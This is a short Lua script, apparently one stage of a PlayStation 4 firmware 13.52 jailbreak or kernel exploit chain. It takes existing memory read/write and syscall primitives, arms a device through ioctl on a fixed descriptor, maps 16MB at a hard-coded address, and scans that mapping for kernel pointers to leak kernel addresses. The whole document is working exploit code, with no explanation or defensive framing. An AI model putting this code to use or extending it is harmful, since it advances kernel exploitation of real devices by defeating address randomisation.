-- PS4 FW 13.52 - FULL 16MB KERNEL-POINTER SWEEP v2 (r9ag) — map 16MB properly
local mem = rawget(_G, "memory")
local S = rawget(_G, "syscall")

pcall(S.resolve, { ioctl = 54, mmap = 477 })

local function t(v)
  if v == nil then return -1 end
  if type(v) == "number" then return v end
  if type(v) == "table" and v.h ~= nil then return v.h * 4294967296 + v.l end
  return tonumber(tostring(v)) or -1
end

print("=== R9AG START ===")
pcall(function()
  local buf = mem.alloc(0x200)
  mem.write_buffer(buf, string.rep(string.char(0x00), 0x200), 0x200)
  mem.write_qword(buf, 0x2ec48000)
  mem.write_qword(buf + 8, 0x1000000)
  local rarm = t(S.ioctl(5, 0x80108002, buf))
  local m = t(S.mmap(0x2ec48000, 0x1000000, 3, 0x0001, 5, 0))
  print("arm=" .. rarm .. " map=0x" .. string.format("%x", m))
  local hits = {}
  local nz = 0
  for i = 0, 0x1fffff do
    local v = t(mem.read_qword(m + i * 8))
    if v ~= 0 then
      nz = nz + 1
      if v >= 0xfffffff000000000 then
        hits[#hits + 1] = string.format("%07x=%016x", i * 8, v)
        if #hits > 60 then break end
      end
    end
  end
  print("non_zero_qwords=" .. nz .. " kernel_hits=" .. #hits)
  for _, h in ipairs(hits) do print("K" .. h) end
end)
print("=== R9AG DONE ===")
